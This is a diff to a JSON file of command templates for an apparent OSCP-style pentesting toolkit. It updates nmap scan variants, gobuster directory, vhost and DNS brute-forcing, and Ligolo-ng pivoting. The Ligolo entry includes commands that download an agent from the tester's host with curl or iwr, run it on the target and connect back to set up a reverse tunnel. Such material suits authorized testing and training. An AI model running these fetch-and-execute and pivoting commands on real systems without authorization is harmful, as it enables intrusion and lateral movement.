@@ -12,17 +12,17 @@
       "description": "Network mapper / port scanner",
       "dependencies": [],
       "templates": [
-        "nmap -sC -sV -oN \"$OSCP_NMAP/{{IP}}_tcp.txt\" {{IP}}",
-        "nmap -A {{IP}} -oN \"$OSCP_NMAP/{{IP}}_advanced.txt\" {{IP}}",
-        "sudo nmap -p- -sS -sU --min-rate 1000 --max-retries 1 -T4 -oN \"$OSCP_NMAP/{{IP}}_fast_tcp_udp.txt\" {{IP}}",
-        "nmap -p- -T4 -n -Pn -oN \"$OSCP_NMAP/{{IP}}_fast_ports.txt\" {{IP}}",
-        "sudo nmap --min-rate 5000 -p- -vvv -Pn -n -oG \"$OSCP_NMAP/{{IP}}_openPorts.gnmap\" {{IP}}",
-        "nmap -p- -oN \"$OSCP_NMAP/{{IP}}_all_ports.txt\" {{IP}}",
-        "nmap --top-ports {{TOP_PORTS}} -oN \"$OSCP_NMAP/{{IP}}_top_{{TOP_PORTS}}.txt\" {{IP}}",
-        "nmap -sU --top-ports 100 -oN \"$OSCP_UDP/{{IP}}_udp_top100.txt\" {{IP}}",
-        "nmap -sC -sV -p {{PORTS}} -oN \"$OSCP_SERVICES/{{IP}}_targeted.txt\" {{IP}}",
-        "nmap --script=smb-vuln* -p 445 -oN \"$OSCP_SERVICES/{{IP}}_smb_vulns.txt\" {{IP}}",
-        "nmap --script=ldap* -p 389,636 -oN \"$OSCP_SERVICES/{{IP}}_ldap.txt\" {{IP}}"
+        "nmap -sT -sC -sV -oN \"$OSCP_NMAP/{{IP}}_tcp_connect.txt\" {{IP}}",
+        "sudo nmap -A -oN \"$OSCP_NMAP/{{IP}}_advanced_root.txt\" {{IP}}",
+        "sudo nmap -p- -sS -sU --min-rate 1000 --max-retries 1 -T4 -oN \"$OSCP_NMAP/{{IP}}_fast_tcp_udp_root.txt\" {{IP}}",
+        "nmap -sT -p- -T4 -n -Pn -oN \"$OSCP_NMAP/{{IP}}_fast_ports_connect.txt\" {{IP}}",
+        "sudo nmap --min-rate 5000 -p- -vvv -Pn -n -oG \"$OSCP_NMAP/{{IP}}_openPorts_root.gnmap\" {{IP}}",
+        "nmap -sT -p- -oN \"$OSCP_NMAP/{{IP}}_all_ports_connect.txt\" {{IP}}",
+        "nmap -sT --top-ports {{TOP_PORTS}} -oN \"$OSCP_NMAP/{{IP}}_top_{{TOP_PORTS}}.txt\" {{IP}}",
+        "sudo nmap -sU --top-ports 100 -oN \"$OSCP_UDP/{{IP}}_udp_top100_root.txt\" {{IP}}",
+        "nmap -sT -sC -sV -p {{PORTS}} -oN \"$OSCP_SERVICES/{{IP}}_targeted.txt\" {{IP}}",
+        "nmap -sT --script=smb-vuln* -p 445 -oN \"$OSCP_SERVICES/{{IP}}_smb_vulns.txt\" {{IP}}",
+        "nmap -sT --script=ldap* -p 389,636 -oN \"$OSCP_SERVICES/{{IP}}_ldap.txt\" {{IP}}"
       ],
       "doc_link": "cheatsheets/nmap.md",
       "favorite": true,
@@ -87,11 +87,11 @@
       "description": "Directory/DNS/vhost bruteforcer",
       "dependencies": [],
       "templates": [
-        "gobuster dir -u http://{{IP}} -w /usr/share/wordlists/dirb/common.txt",
-        "gobuster dir -u http://{{IP}} -w {{WORDLIST}} -x php,html,txt -t 50",
-        "gobuster dir -u http://{{IP}} -w {{WORDLIST}} -x php,html,txt -t 50 -k",
-        "gobuster vhost -u http://{{IP}} -w {{WORDLIST}} --append-domain",
-        "gobuster dns -d {{DOMAIN}} -w {{WORDLIST}}"
+        "gobuster dir -u http://{{IP}} -w {{WEB_WORDLIST}} -t 50",
+        "gobuster dir -u http://{{IP}} -w {{WEB_WORDLIST}} -x php,html,txt,asp,aspx,jsp -t 50",
+        "gobuster dir -k -u https://{{IP}} -w {{WEB_WORDLIST}} -x php,html,txt,asp,aspx,jsp -t 50",
+        "gobuster vhost -u http://{{DOMAIN}} -w {{VHOST_WORDLIST}} --append-domain -t 50",
+        "gobuster dns -d {{DOMAIN}} -w {{DNS_WORDLIST}} -t 50"
       ],
       "doc_link": "",
       "favorite": false,
@@ -820,11 +820,17 @@
       "description": "Ligolo-ng - reverse tunnel / pivoting",
       "dependencies": [],
       "templates": [
-        "$BIN_LIN/network/ligolo/ligolo_proxy_lin -selfcert",
-        "iwr http://{{LHOST}}:8000/ligolo_agent_win.exe -OutFile C:\\Windows\\Temp\\ag.exe; C:\\Windows\\Temp\\ag.exe -connect {{LHOST}}:11601 -ignore-cert",
-        "curl http://{{LHOST}}:8000/ligolo_agent_lin -o /tmp/ag && chmod +x /tmp/ag && /tmp/ag -connect {{LHOST}}:11601 -ignore-cert"
+        "sudo ip tuntap add user ${USER:-kali} mode tun {{LIGOLO_IFACE}} 2>/dev/null || true; sudo ip link set {{LIGOLO_IFACE}} up",
+        "sudo $BIN_LIN/network/ligolo/ligolo_proxy_lin -selfcert -laddr 0.0.0.0:{{LIGOLO_PORT}}",
+        "iwr http://{{LHOST}}:8000/ligolo_agent_win.exe -OutFile C:\\Windows\\Temp\\agent.exe; C:\\Windows\\Temp\\agent.exe -connect {{LHOST}}:{{LIGOLO_PORT}} -ignore-cert",
+        "curl http://{{LHOST}}:8000/ligolo_agent_lin -o /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect {{LHOST}}:{{LIGOLO_PORT}} -ignore-cert",
+        "printf 'Ligolo prompt:\\nsession\\ntunnel_start --tun {{LIGOLO_IFACE}}\\n'",
+        "sudo ip route add {{SUBNET}} dev {{LIGOLO_IFACE}} && ip route",
+        "printf 'Ligolo listener:\\nlistener_add --addr 0.0.0.0:{{LIGOLO_PORT}} --to 127.0.0.1:{{LIGOLO_PORT}} --tcp\\nlistener_list\\n'",
+        "sudo pkill -9 -f ligolo; sudo ip link delete ligolo 2>/dev/null; sudo ip link delete {{LIGOLO_IFACE}} 2>/dev/null; sudo ss -tulpn | grep {{LIGOLO_PORT}} || true",
+        "sudo rm -f ~/.ligolo-ng/cert.pem ~/.ligolo-ng/key.pem /opt/ligolo-ng/cert.pem /opt/ligolo-ng/key.pem"
       ],
-      "doc_link": "",
+      "doc_link": "cheatsheets/ligolo.md",
       "favorite": true,
       "history": []
     },
